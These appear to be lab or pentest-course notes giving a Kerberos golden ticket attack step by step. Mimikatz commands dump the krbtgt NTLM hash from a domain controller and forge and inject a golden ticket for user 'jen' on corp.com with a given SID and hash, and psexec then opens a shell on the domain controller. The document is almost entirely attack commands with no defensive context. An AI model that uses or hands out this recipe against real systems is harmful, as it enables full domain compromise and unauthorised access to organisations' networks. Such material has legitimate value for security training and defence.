access to domain controller
then obtain the krbtgt NTLM hash with mimikatz
```
privilege::debug
lsadump::lsa /patch
```

purging existing kerberos tickets
```
kerberos::purge
```

creating a golden ticket using mimikatz
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

golden ticket injected into memory
```
misc::cmd
```

use psexec.exe
```
.\psexec.exe \\dc1 cmd.exe
```